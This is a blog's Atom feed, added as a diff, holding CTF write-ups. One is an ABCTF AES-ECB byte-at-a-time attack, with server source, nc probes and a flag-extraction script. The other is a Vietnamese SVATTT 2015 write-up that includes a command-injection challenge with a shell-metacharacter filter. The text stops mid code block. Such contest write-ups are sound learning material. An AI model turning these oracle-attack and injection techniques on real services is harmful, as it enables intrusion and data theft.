@@ -1,0 +1,2118 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title><![CDATA[punMag]]></title>
+  <link href="http://tungpun.github.io/atom.xml" rel="self"/>
+  <link href="http://tungpun.github.io/"/>
+  <updated>2016-07-23T18:55:23+07:00</updated>
+  <id>http://tungpun.github.io/</id>
+  <author>
+    <name><![CDATA[Tung Pun]]></name>
+    
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[ABCTF - Encryption Service - Writeup]]></title>
+    <link href="http://tungpun.github.io/blog/2016/07/19/abctf-encryption-service-writeup/"/>
+    <updated>2016-07-19T16:27:14+07:00</updated>
+    <id>http://tungpun.github.io/blog/2016/07/19/abctf-encryption-service-writeup</id>
+    <content type="html"><![CDATA[<p>Long time, no post.</p>
+
+<p>Today, I am going to write about a Crypto challenge from <a href="http://abctf.xyz/problems">ABCTF</a>. Although it is just a competition for high school student, it still contains funny stuffs.</p>
+
+<p>In this challange, they give us:</p>
+
+<pre><code>See if you can break this!! 
+You can connect with nc 107.170.122.6 7765 and the source can be found [here](http://pastebin.com/UTkSDn4H).
+</code></pre>
+
+<p>Content of that file was extracted as below:</p>
+
+<div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#/usr/bin/env python</span>
+</span><span class='line'><span class="kn">from</span> <span class="nn">Crypto.Cipher.AES</span> <span class="kn">import</span> <span class="n">AESCipher</span>
+</span><span class='line'>
+</span><span class='line'><span class="kn">import</span> <span class="nn">SocketServer</span><span class="o">,</span><span class="nn">threading</span><span class="o">,</span><span class="nn">os</span><span class="o">,</span><span class="nn">time</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">signal</span>
+</span><span class='line'>
+</span><span class='line'><span class="kn">from</span> <span class="nn">secret2</span> <span class="kn">import</span> <span class="n">FLAG</span><span class="p">,</span> <span class="n">KEY</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">PORT</span> <span class="o">=</span> <span class="mi">7765</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">def</span> <span class="nf">pad</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
+</span><span class='line'>  <span class="n">l</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">needed</span> <span class="o">=</span> <span class="mi">16</span> <span class="o">-</span> <span class="p">(</span><span class="n">l</span> <span class="o">%</span> <span class="mi">16</span><span class="p">)</span>
+</span><span class='line'>  <span class="k">return</span> <span class="n">s</span> <span class="o">+</span> <span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">needed</span><span class="p">)</span> <span class="o">*</span> <span class="n">needed</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">def</span> <span class="nf">encrypt</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
+</span><span class='line'>  <span class="k">return</span> <span class="n">AESCipher</span><span class="p">(</span><span class="n">KEY</span><span class="p">)</span><span class="o">.</span><span class="n">encrypt</span><span class="p">(</span><span class="n">pad</span><span class="p">(</span><span class="s">&#39;ENCRYPT:&#39;</span> <span class="o">+</span> <span class="n">s</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s">&#39;hex&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="n">FLAG</span><span class="p">))</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">class</span> <span class="nc">incoming</span><span class="p">(</span><span class="n">SocketServer</span><span class="o">.</span><span class="n">BaseRequestHandler</span><span class="p">):</span>
+</span><span class='line'>    <span class="k">def</span> <span class="nf">handle</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span><span class='line'>        <span class="n">atfork</span><span class="p">()</span>
+</span><span class='line'>        <span class="n">req</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">request</span>
+</span><span class='line'>
+</span><span class='line'>        <span class="k">def</span> <span class="nf">recvline</span><span class="p">():</span>
+</span><span class='line'>            <span class="n">buf</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
+</span><span class='line'>            <span class="k">while</span> <span class="ow">not</span> <span class="n">buf</span><span class="o">.</span><span class="n">endswith</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">):</span>
+</span><span class='line'>                <span class="n">buf</span> <span class="o">+=</span> <span class="n">req</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span><span class='line'>            <span class="k">return</span> <span class="n">buf</span>
+</span><span class='line'>        <span class="n">signal</span><span class="o">.</span><span class="n">alarm</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'>        <span class="n">req</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="s">&quot;Send me some hex-encoded data to encrypt:</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
+</span><span class='line'>        <span class="n">data</span> <span class="o">=</span> <span class="n">recvline</span><span class="p">()</span>
+</span><span class='line'>        <span class="n">req</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="s">&quot;Here you go:&quot;</span><span class="p">)</span>
+</span><span class='line'>        <span class="n">req</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">encrypt</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">&#39;hex&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
+</span><span class='line'>        <span class="n">req</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">class</span> <span class="nc">ReusableTCPServer</span><span class="p">(</span><span class="n">SocketServer</span><span class="o">.</span><span class="n">ForkingMixIn</span><span class="p">,</span> <span class="n">SocketServer</span><span class="o">.</span><span class="n">TCPServer</span><span class="p">):</span>
+</span><span class='line'>  <span class="k">pass</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">SocketServer</span><span class="o">.</span><span class="n">TCPServer</span><span class="o">.</span><span class="n">allow_reuse_address</span> <span class="o">=</span> <span class="bp">True</span>
+</span><span class='line'><span class="n">server</span> <span class="o">=</span> <span class="n">ReusableTCPServer</span><span class="p">((</span><span class="s">&quot;0.0.0.0&quot;</span><span class="p">,</span> <span class="n">PORT</span><span class="p">),</span> <span class="n">incoming</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">print</span> <span class="s">&quot;Server listening on port </span><span class="si">%d</span><span class="s">&quot;</span> <span class="o">%</span> <span class="n">PORT</span>
+</span><span class='line'><span class="n">server</span><span class="o">.</span><span class="n">serve_forever</span><span class="p">()</span>
+</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+
+<p>As you see, the service receives our message, uses <a href="https://en.wikipedia.org/wiki/Advanced_Encryption_Standard">AES Encryption</a> to encrypt the received message, then returns the ciphertext for us.</p>
+
+<p>The key is fairly secret.</p>
+
+<p>The blocksize is 16 bytes.</p>
+
+<p>The cryto system uses ECB mode.</p>
+
+<p>I verify that with some case studies:</p>
+
+<div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="err">➜</span>  <span class="n">abctf</span> <span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s">&#39;print &quot;41&quot; * 16&#39;</span> <span class="o">|</span> <span class="n">nc</span> <span class="mf">107.170</span><span class="o">.</span><span class="mf">122.6</span> <span class="mi">7765</span>
+</span><span class='line'><span class="n">Send</span> <span class="n">me</span> <span class="n">some</span> <span class="nb">hex</span><span class="o">-</span><span class="n">encoded</span> <span class="n">data</span> <span class="n">to</span> <span class="n">encrypt</span><span class="p">:</span>
+</span><span class='line'><span class="n">Here</span> <span class="n">you</span> <span class="n">go</span><span class="p">:</span><span class="n">cd7985389a47184ce3f957b15a1c45f3729e426405f3273470de17375b203fd4f4f4af26204581fa57313f57a1c57bae</span>
+</span><span class='line'><span class="err">➜</span>  <span class="n">abctf</span> <span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s">&#39;print &quot;41&quot; * 17&#39;</span> <span class="o">|</span> <span class="n">nc</span> <span class="mf">107.170</span><span class="o">.</span><span class="mf">122.6</span> <span class="mi">7765</span>
+</span><span class='line'><span class="n">Send</span> <span class="n">me</span> <span class="n">some</span> <span class="nb">hex</span><span class="o">-</span><span class="n">encoded</span> <span class="n">data</span> <span class="n">to</span> <span class="n">encrypt</span><span class="p">:</span>
+</span><span class='line'><span class="n">Here</span> <span class="n">you</span> <span class="n">go</span><span class="p">:</span><span class="n">cd7985389a47184ce3f957b15a1c45f356ef6d3f0e00fe8259a67b87a0cf8d4764851b9b4880d691d8e84fce0c35bbef</span>
+</span><span class='line'><span class="err">➜</span>  <span class="n">abctf</span> <span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s">&#39;print &quot;41&quot; * 32&#39;</span> <span class="o">|</span> <span class="n">nc</span> <span class="mf">107.170</span><span class="o">.</span><span class="mf">122.6</span> <span class="mi">7765</span>
+</span><span class='line'><span class="n">Send</span> <span class="n">me</span> <span class="n">some</span> <span class="nb">hex</span><span class="o">-</span><span class="n">encoded</span> <span class="n">data</span> <span class="n">to</span> <span class="n">encrypt</span><span class="p">:</span>
+</span><span class='line'><span class="n">Here</span> <span class="n">you</span> <span class="n">go</span><span class="p">:</span><span class="n">cd7985389a47184ce3f957b15a1c45f31c621e4e2c3a88d1aa65d60efa13b737729e426405f3273470de17375b203fd4f4f4af26204581fa57313f57a1c57bae</span>
+</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+
+
+
+<div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="err">➜</span>  <span class="n">abctf</span> <span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s">&#39;print &quot;41&quot; * 16 + &quot;42&quot; * 16&#39;</span> <span class="o">|</span> <span class="n">nc</span> <span class="mf">107.170</span><span class="o">.</span><span class="mf">122.6</span> <span class="mi">7765</span>
+</span><span class='line'><span class="n">Send</span> <span class="n">me</span> <span class="n">some</span> <span class="nb">hex</span><span class="o">-</span><span class="n">encoded</span> <span class="n">data</span> <span class="n">to</span> <span class="n">encrypt</span><span class="p">:</span>
+</span><span class='line'><span class="n">Here</span> <span class="n">you</span> <span class="n">go</span><span class="p">:</span><span class="n">cd7985389a47184ce3f957b15a1c45f3a8e1e0aeb6ec9e58900539dbf3b8b348e2c76f25146263bc14c8d4c2cdf87baef4f4af26204581fa57313f57a1c57bae</span>
+</span><span class='line'><span class="err">➜</span>  <span class="n">abctf</span> <span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s">&#39;print &quot;43&quot; * 16 + &quot;42&quot; * 16&#39;</span> <span class="o">|</span> <span class="n">nc</span> <span class="mf">107.170</span><span class="o">.</span><span class="mf">122.6</span> <span class="mi">7765</span>
+</span><span class='line'><span class="n">Send</span> <span class="n">me</span> <span class="n">some</span> <span class="nb">hex</span><span class="o">-</span><span class="n">encoded</span> <span class="n">data</span> <span class="n">to</span> <span class="n">encrypt</span><span class="p">:</span>
+</span><span class='line'><span class="n">Here</span> <span class="n">you</span> <span class="n">go</span><span class="p">:</span><span class="n">c6245c02399859146b835ab639c2ec45d14401a93319c6f9705cdafe21743362e2c76f25146263bc14c8d4c2cdf87baef4f4af26204581fa57313f57a1c57bae</span>
+</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+
+<p>Now, I focus on the below information:</p>
+
+<p><code>PLAINTEXT = 'ENCRYPT:' + message + FLAG + padding</code></p>
+
+<p>Let draft:</p>
+
+<div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="o">|-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|</span>
+</span><span class='line'><span class="o">|</span>                             <span class="n">PLAINTEXT</span>                                               <span class="o">|</span>                                <span class="n">CIPHERTEXT</span>                                                                                       <span class="o">|</span>
+</span><span class='line'><span class="o">|</span>     <span class="n">prefix</span>       <span class="o">|</span>              <span class="n">message</span>                           <span class="o">|</span>  <span class="n">postfix</span>        <span class="o">|</span>                                                                                                                                 <span class="o">|</span>
+</span><span class='line'><span class="o">|</span>                  <span class="o">|</span> <span class="n">block</span> <span class="mi">0</span> <span class="p">(</span><span class="mi">16</span><span class="n">b</span><span class="p">)</span> <span class="o">|</span>  <span class="n">block</span> <span class="mi">1</span> <span class="p">(</span><span class="mi">16</span><span class="n">b</span><span class="p">)</span> <span class="o">|</span>     <span class="n">flag</span>      <span class="o">|</span>  <span class="n">padding</span>        <span class="o">|</span>              <span class="n">prefix</span>                 <span class="o">|</span>        <span class="n">block</span> <span class="mi">0</span>                    <span class="o">|</span>             <span class="n">block</span> <span class="mi">1</span>              <span class="o">|</span>   <span class="n">posfix</span>           <span class="o">|</span>
+</span><span class='line'><span class="o">|-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|</span>
+</span><span class='line'><span class="o">|</span> <span class="n">ENCRYPT</span><span class="p">:</span><span class="mi">12345678</span>    <span class="n">aaa</span> <span class="o">...</span> <span class="n">aaA</span>     <span class="n">aaa</span> <span class="o">...</span> <span class="n">aaa</span>     <span class="n">AEXAMPLE</span>        <span class="mh">0x0</span><span class="n">x0x0x</span> <span class="o">...</span>    <span class="o">|</span>   <span class="n">f53163fdcfc8923ed221f1acb77d79d9</span>    <span class="n">ff714c1d533d7394f7d612cb0244c9a5</span>    <span class="n">ff714c1d533d7394f7d612cb0244c9a5</span>    <span class="o">.</span> <span class="o">.</span> <span class="o">.</span>             <span class="o">|</span>
+</span><span class='line'><span class="o">|</span> <span class="n">ENCRYPT</span><span class="p">:</span><span class="mi">12345678</span>    <span class="n">aaa</span> <span class="o">...</span> <span class="n">aaa</span>     <span class="n">aaa</span> <span class="o">...</span> <span class="n">aaA</span>     <span class="n">XAMPLEFLAG0x</span>    <span class="mh">0x0</span><span class="n">x0x0x</span> <span class="o">...</span>    <span class="o">|</span>   <span class="n">f53163fdcfc8923ed221f1acb77d79d9</span>    <span class="n">ff714c1d533d7394f7d612cb0244c9a5</span>    <span class="mi">5</span><span class="n">bcd55b9108751d49c90e55156b693e2</span>    <span class="o">.</span> <span class="o">.</span> <span class="o">.</span>   <span class="o">&lt;-</span>        <span class="o">|</span>
+</span><span class='line'><span class="o">|</span> <span class="o">-</span> <span class="p">[</span> <span class="n">Let</span><span class="s">&#39;s try ] -                                                                                                                                                                                                     |</span>
+</span><span class='line'><span class="o">|</span> <span class="n">ENCRYPT</span><span class="p">:</span><span class="mi">12345678</span>    <span class="n">aaa</span> <span class="o">...</span> <span class="n">aaa</span>     <span class="n">aaa</span> <span class="o">...</span> <span class="n">aay</span>     <span class="n">AEXAMPLEFLAG</span>    <span class="mh">0x0</span><span class="n">x0x0x</span> <span class="o">...</span>    <span class="o">|</span>   <span class="n">f53163fdcfc8923ed221f1acb77d79d9</span>    <span class="n">ff714c1d533d7394f7d612cb0244c9a5</span>    <span class="n">c6dfb6ca2e95061f3f489747a9863368</span>    <span class="o">.</span> <span class="o">.</span> <span class="o">.</span>             <span class="o">|</span>
+</span><span class='line'><span class="o">|</span> <span class="n">ENCRYPT</span><span class="p">:</span><span class="mi">12345678</span>    <span class="n">aaa</span> <span class="o">...</span> <span class="n">aaa</span>     <span class="n">aaa</span> <span class="o">...</span> <span class="n">aaz</span>     <span class="n">AEXAMPLEFLAG</span>    <span class="mh">0x0</span><span class="n">x0x0x</span> <span class="o">...</span>    <span class="o">|</span>   <span class="n">f53163fdcfc8923ed221f1acb77d79d9</span>    <span class="n">ff714c1d533d7394f7d612cb0244c9a5</span>    <span class="n">fd69bf1e57642c703d9cdbea681e5f74</span>    <span class="o">.</span> <span class="o">.</span> <span class="o">.</span>             <span class="o">|</span>
+</span><span class='line'><span class="o">|</span> <span class="n">ENCRYPT</span><span class="p">:</span><span class="mi">12345678</span>    <span class="n">aaa</span> <span class="o">...</span> <span class="n">aaa</span>     <span class="n">aaa</span> <span class="o">...</span> <span class="n">aaA</span>     <span class="n">AEXAMPLEFLAG</span>    <span class="mh">0x0</span><span class="n">x0x0x</span> <span class="o">...</span>    <span class="o">|</span>   <span class="n">f53163fdcfc8923ed221f1acb77d79d9</span>    <span class="n">ff714c1d533d7394f7d612cb0244c9a5</span>    <span class="mi">5</span><span class="n">bcd55b9108751d49c90e55156b693e2</span>    <span class="o">.</span> <span class="o">.</span> <span class="o">.</span>   <span class="o">&lt;-</span> <span class="n">Found</span>  <span class="o">|</span>
+</span><span class='line'><span class="o">|</span> <span class="n">ENCRYPT</span><span class="p">:</span><span class="mi">12345678</span>    <span class="n">aaa</span> <span class="o">...</span> <span class="n">aaa</span>     <span class="n">aaa</span> <span class="o">...</span> <span class="n">aaB</span>     <span class="n">AEXAMPLEFLAG</span>    <span class="mh">0x0</span><span class="n">x0x0x</span> <span class="o">...</span>    <span class="o">|</span>   <span class="n">f53163fdcfc8923ed221f1acb77d79d9</span>    <span class="n">ff714c1d533d7394f7d612cb0244c9a5</span>    <span class="n">fe11d61bfa6a55edfcc8135b6923ec12</span>    <span class="o">.</span> <span class="o">.</span> <span class="o">.</span>             <span class="o">|</span>
+</span><span class='line'><span class="o">|</span> <span class="n">ENCRYPT</span><span class="p">:</span><span class="mi">12345678</span>    <span class="o">.</span> <span class="o">.</span> <span class="o">.</span>                                                           <span class="o">|</span>                                                                                                                                 <span class="o">|</span>
+</span><span class='line'><span class="o">|-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|</span>
+</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+
+<p>Woah. I can guest the flag based on the crypto system.
+The next stage is to write a script to automate the work.</p>
+
+<div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">from</span> <span class="nn">punpwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">def</span> <span class="nf">get_cip</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
+</span><span class='line'>    <span class="n">pp</span> <span class="o">=</span> <span class="n">PunPwn</span><span class="p">(</span><span class="s">&#39;107.170.122.6&#39;</span><span class="p">,</span> <span class="mi">7765</span><span class="p">)</span>
+</span><span class='line'>    <span class="n">pp</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&#39;:&#39;</span><span class="p">)</span>
+</span><span class='line'>    <span class="n">pp</span><span class="o">.</span><span class="n">sent</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+</span><span class='line'>    <span class="n">pp</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
+</span><span class='line'>    <span class="n">resp</span> <span class="o">=</span> <span class="n">pp</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
+</span><span class='line'>    <span class="k">return</span> <span class="n">resp</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">&#39;:&#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">][:</span><span class="mi">64</span><span class="p">]</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">def</span> <span class="nf">check</span><span class="p">(</span><span class="n">postfix</span><span class="p">):</span>
+</span><span class='line'>    <span class="n">pad</span> <span class="o">=</span> <span class="p">(</span><span class="mi">48</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">postfix</span><span class="p">))</span> <span class="o">*</span> <span class="s">&#39;1&#39;</span>
+</span><span class='line'>    <span class="n">cip1</span> <span class="o">=</span> <span class="n">get_cip</span><span class="p">(</span><span class="n">pad</span><span class="p">)</span>
+</span><span class='line'>    <span class="n">cip2</span> <span class="o">=</span> <span class="n">get_cip</span><span class="p">(</span><span class="n">pad</span> <span class="o">+</span> <span class="n">postfix</span><span class="p">)</span>
+</span><span class='line'>    <span class="k">return</span> <span class="n">cip1</span> <span class="o">==</span> <span class="n">cip2</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">&#39;__main__&#39;</span><span class="p">:</span>
+</span><span class='line'>    <span class="n">res</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
+</span><span class='line'>    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+</span><span class='line'>        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">48</span><span class="p">,</span> <span class="mi">256</span><span class="p">):</span>
+</span><span class='line'>            <span class="n">postfix</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">&#39;hex&#39;</span><span class="p">)</span>
+</span><span class='line'>            <span class="k">print</span> <span class="s">&quot;res: &quot;</span><span class="p">,</span> <span class="n">res</span>
+</span><span class='line'>            <span class="k">if</span> <span class="n">check</span><span class="p">(</span><span class="n">res</span> <span class="o">+</span> <span class="n">postfix</span><span class="p">):</span>
+</span><span class='line'>                <span class="n">res</span> <span class="o">=</span> <span class="n">res</span> <span class="o">+</span> <span class="n">postfix</span>
+</span><span class='line'>                <span class="k">break</span>
+</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+
+<p>My favor scripting lannguage is Python.
+I use my own lib - (punpwn)[<a href="https://github.com/tungpun/punpwn">https://github.com/tungpun/punpwn</a>], that was forked from (pwntools lib)[pwntools.readthedocs.org].</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Vòng Loại Sinh Viên Với an Toàn Thông Tin 2015 - Writeups]]></title>
+    <link href="http://tungpun.github.io/blog/2015/11/07/svattt2015-qualification/"/>
+    <updated>2015-11-07T14:17:10+07:00</updated>
+    <id>http://tungpun.github.io/blog/2015/11/07/svattt2015-qualification</id>
+    <content type="html"><![CDATA[<p>Sinh viên với An toàn thông tin 2015 là một kì thi cho sinh viên được tổ chức dưới dạng các bài thi CTF kết hợp với những challenge lý thuyết - chúng ta có thể giải được bằng các kĩ thuật recon ;))</p>
+
+<p>Trong vòng loại, team mình là Animal.OhYeah (viết liền, không có dấu cách) có thứ hạng cũng khá cao #firstPlace nên hôm nay mình cũng có chút động lực để chia sẻ. Mọi lần mình viết bằng Tiếng Anh, nhưng mà mình viết chán quá đọc chả ai hiểu cả, nên lần này mình quyết định viết bằng tiếng Việt.</p>
+
+<p>Trong vòng thi vừa rồi, mình hỗ trợ các bạn khác trong nhóm giải các lây hỏi lý thuyết trắc nghiệm, hai bài exploit 100, bài hidden 100, tự mình không giải được bài nào cả.</p>
+
+<p>Hiện tại tính đến thời điểm mình viết bài thì các challenge vẫn available tại <a href="http://svattt.vnsecurity.net/">đây</a></p>
+
+<h2>Misc 100 - Quảng Ngãi :: Hidden</h2>
+
+<pre><code>Hidden
+CTF :)
+</code></pre>
+
+<p><a href="http://119.15.167.211/static/materials/misc100.html_659ff899f5bb31242424b127aafb9a35">Read this.</a></p>
+
+<p>Bọn mình download file kia về, copy một đoạn để tìm file gốc trên google, sau đó quan sát và phát hiện giữa hai file có một số kí tự bị thay đổi là <code>-</code>, <code>.</code> và <code></code> .</p>
+
+<blockquote><p>Morse code ?</p></blockquote>
+
+<p>Mình quyết định viết thử tool, còn bạn mình thì (trâu bò) dùng tay. Cuối cùng thì tool mình chạy sai không ra, bạn mình có kết quả trước.</p>
+
+<p>Flag: <code>SVATTTM0RS3</code></p>
+
+<h2>Exploit 100 - Hoàng Sa ::  int i = 0;</h2>
+
+<pre><code>int i = 0;
+Hint: &lt; &gt; ! @ # $ % ^ `
+nc 119.15.167.212 31338
+</code></pre>
+
+<p><a href="http://119.15.167.211/static/materials/exp100.c_a0a271df98aec280f58bb5cfd9991709">Source</a></p>
+
+<p>Bài này một bạn trong team mình reverse, sau đó kêu mình cứ ghi tràn 128 bytes <code>null</code> và sau đó có thể gửi dữ liệu vào được.
+Dữ liệu vào sẽ được ghép vào hàm <code>man</code> và thực thi như sau:</p>
+
+<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>"man " + input</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+
+<p>Mình chạy sang xem qua thì thấy filter một vài ký tự :</p>
+
+<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>if(strchr(buffer,'-')!=0) return 0;
+</span><span class='line'>if(strchr(buffer,';')!=0) return 0;
+</span><span class='line'>if(strchr(buffer,'|')!=0) return 0;
+</span><span class='line'>if(strchr(buffer,'&')!=0) return 0;
+</span><span class='line'>if(strchr(buffer,' ')!=0) return 0;
+</span><span class='line'>if(strchr(buffer,'\t')!=0) return 0;
+</span><span class='line'>if(strchr(buffer,'\n')!=0) return 0;
+</span><span class='line'>if(strchr(buffer,'\r')!=0) return 0;
+</span><span class='line'>if(strchr(buffer,'\'')!=0) return 0;
+</span><span class='line'>if(strchr(buffer,'"')!=0) return 0;</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+
+<p>Mình nghĩ đến <code>-l</code> , nhưng không được. Bí quá guessing thử <code>/home/exp100/flag.txt</code> thì ok. Mình cũng chả biết tại sao +_+</p>
+
+<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
